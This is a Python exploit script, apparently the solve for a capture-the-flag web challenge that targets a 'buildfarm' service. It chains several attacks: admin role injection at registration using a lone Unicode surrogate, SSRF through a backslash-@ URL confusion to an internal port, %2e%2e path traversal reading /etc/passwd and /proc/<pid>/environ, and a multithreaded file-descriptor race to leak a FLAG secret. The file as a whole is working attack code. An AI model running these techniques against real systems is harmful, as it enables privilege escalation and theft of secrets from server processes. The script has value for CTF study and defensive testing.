#!/usr/bin/env python3
import json
import os
import random
import re
import socket
import ssl
import sys
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

import requests

BASE = os.environ.get("BASE", "http://localhost:13337").rstrip("/")
MAXPID = int(os.environ.get("MAXPID", "400"))

SCOUT_LO = int(os.environ.get("SCOUT_LO", "13"))
SCOUT_HI = int(os.environ.get("SCOUT_HI", "80"))
N_DONOR = int(os.environ.get("N_DONOR", "4"))
N_FLAG = int(os.environ.get("N_FLAG", "4"))
N_READ = int(os.environ.get("N_READ", "10"))
ROUNDS = int(os.environ.get("ROUNDS", "4"))
RACE_SECS = float(os.environ.get("RACE_SECS", "80"))
PAD = int(os.environ.get("PAD", "16384"))
TMO = float(os.environ.get("TMO", "3"))
FLAG_RE = re.compile(rb"L3AK\{[^}\x00]{0,200}\}")

_u = urllib.parse.urlparse(BASE)
HOST = _u.hostname
if _u.scheme not in {"http", "https"} or HOST is None:
    raise SystemExit("BASE must be an http or https URL")
PORT = _u.port or (443 if _u.scheme == "https" else 80)
TLS_CONTEXT = ssl.create_default_context() if _u.scheme == "https" else None

s = requests.Session()

stop = threading.Event()
found = {}
win_fds = {}
attempts = {"n": 0}


def stage1_admin():
    body = '{"username":"cea","password":"cea","role":"admin\\ud887"}'
    r = s.post(
        BASE + "/api/register",
        data=body,
        headers={"Content-Type": "application/json"},
        timeout=10,
    )
    print("register ->", r.status_code, r.text[:160])
    me = s.get(BASE + "/api/me", timeout=10).json()
    assert me.get("role") == "admin", "stage 1 failed: %r" % me
    print("staff role=admin done")


def ssrf_submit(manifest):
    spec = json.dumps(manifest, separators=(",", ":"))
    q = urllib.parse.urlencode({"spec": spec})
    ssrf = "http://127.0.0.1:8000" + "\\" + "@manifests.buildfarm.internal/x?" + q
    r = s.post(BASE + "/api/manifest", json={"url": ssrf}, timeout=15)
    if r.status_code != 200:
        raise SystemExit(
            "[!] SSRF submit failed: %s %s" % (r.status_code, r.text[:200])
        )
    return r.json()


def is_build_runner(pid):
    path = "/download/%2e%2e/proc/" + str(pid) + "/cwd/build.log"
    return b"buildfarm" in raw_get(path)


def find_runner():
    with ThreadPoolExecutor(max_workers=32) as ex:
        hits = [
            pid
            for pid, ok in zip(
                range(1, MAXPID + 1),
                ex.map(is_build_runner, range(1, MAXPID + 1)),
            )
            if ok
        ]
    return max(hits) if hits else None


def cookie_header():
    return "; ".join("%s=%s" % (c.name, c.value) for c in s.cookies)


def raw_get(path):
    sock = None
    try:
        sock = socket.create_connection((HOST, PORT), timeout=TMO)
        if TLS_CONTEXT is not None:
            sock = TLS_CONTEXT.wrap_socket(sock, server_hostname=HOST)
        sock.settimeout(TMO)
    except Exception:
        if sock is not None:
            sock.close()
        return b""
    req = (
        "GET %s HTTP/1.1\r\nHost: %s\r\nCookie: %s\r\n"
        "Connection: close\r\nUser-Agent: bf-solve\r\n\r\n"
        % (path, _u.netloc, cookie_header())
    )
    data = b""
    try:
        sock.sendall(req.encode())
        while True:
            chunk = sock.recv(65536)
            if not chunk:
                break
            data += chunk
            if FLAG_RE.search(data) or len(data) > 200000:
                break
    except Exception:
        pass
    finally:
        try:
            sock.close()
        except Exception:
            pass
    return data


def flood_donor():
    while not stop.is_set():
        raw_get("/download/%2e%2e/etc/passwd")


def flood_flag(childpid):
    path = "/download/%2e%2e/proc/" + str(childpid) + "/environ"
    while not stop.is_set():
        raw_get(path)


def body_of(data):
    _, _, body = data.partition(b"\r\n\r\n")
    return body


def scout_band(childpid):
    hot = {}
    for n in range(SCOUT_LO, SCOUT_HI + 1):
        for _ in range(4):
            body = body_of(raw_get("/download/%2e%2e/proc/self/fd/" + str(n)))
            match = FLAG_RE.search(body)
            if match:
                found.setdefault("flag", match.group(0).decode("utf-8", "replace"))
                found.setdefault("fd", n)
                return sorted(hot)
            if b"root:x:0:0" in body:
                hot[n] = hot.get(n, 0) + 1
    return sorted(hot)


def reader(band):
    while not stop.is_set():
        n = random.choice(band)
        attempts["n"] += 1
        data = raw_get("/download/%2e%2e/proc/self/fd/" + str(n))
        match = FLAG_RE.search(data)
        if match:
            win_fds[n] = win_fds.get(n, 0) + 1
            found.setdefault("flag", match.group(0).decode("utf-8", "replace"))
            found.setdefault("fd", n)
            stop.set()
            return


def race_once(childpid, secs):
    stop.clear()
    win_fds.clear()
    found.clear()
    attempts["n"] = 0
    floods = [threading.Thread(target=flood_donor, daemon=True) for _ in range(N_DONOR)]
    floods += [
        threading.Thread(target=flood_flag, args=(childpid,), daemon=True)
        for _ in range(N_FLAG)
    ]
    for thread in floods:
        thread.start()
    time.sleep(0.7)

    hot = scout_band(childpid)
    if "flag" in found:
        stop.set()
        for thread in floods:
            thread.join(timeout=TMO + 1)
        return True
    if hot:
        band = list(range(max(SCOUT_LO, hot[0] - 3), hot[-1] + 4))
    else:
        band = list(range(SCOUT_LO, SCOUT_HI + 1))
    print(
        "scouted donor band %s -> readers sweep fd[%d..%d]"
        % (hot, band[0], band[-1])
    )

    readers = [
        threading.Thread(target=reader, args=(band,), daemon=True)
        for _ in range(N_READ)
    ]
    for thread in readers:
        thread.start()

    started = time.time()
    last = 0
    while not stop.is_set() and time.time() - started < secs:
        time.sleep(2)
        wins = sum(win_fds.values())
        sys.stdout.write(
            "\r    t=%3ds attempts=%-7d wins=%-2d (+%d) fds=%s        "
            % (
                int(time.time() - started),
                attempts["n"],
                wins,
                wins - last,
                dict(sorted(win_fds.items())),
            )
        )
        sys.stdout.flush()
        last = wins
    print()

    stop.set()
    for thread in floods + readers:
        thread.join(timeout=TMO + 1)
    return "flag" in found


def main():
    stage1_admin()

    for _round in range(1, ROUNDS + 1):
        ssrf_submit(
            {
                "task": "build",
                "ttl": 90,
                "env": {"FLAG": "${FLAG}", "PIPELINE_CACHE": "A" * PAD},
            }
        )

        childpid = None
        for _ in range(40):
            childpid = find_runner()
            if childpid is not None:
                break
            time.sleep(0.25)
        if childpid is None:
            print("runner issue..")
            continue
        print("pid = %d" % childpid)

        if race_once(childpid, RACE_SECS):
            print("\nflag:", found["flag"], "(won on fd %d)" % found["fd"])
            return 0
        print("rnd failed")

    print("solve failed")
    return 2


if __name__ == "__main__":
    sys.exit(main())
